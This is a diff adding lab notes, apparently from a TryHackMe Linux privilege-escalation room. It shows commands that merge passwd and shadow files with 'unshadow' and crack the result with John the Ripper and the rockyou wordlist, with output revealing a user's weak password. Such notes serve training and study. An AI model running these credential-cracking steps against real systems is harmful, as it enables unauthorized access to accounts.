@@ -1,0 +1,13 @@
+unshadow passwd shadow > unshadowed.txt
+
+┌──(kali㉿kali)-[~/…/THM/rooms/linux_privesc/privesc_cron]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123456           (matt)     
+1g 0:00:00:00 DONE (2022-06-12 02:00) 8.333g/s 2133p/s 2133c/s 2133C/s 123456..freedom
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
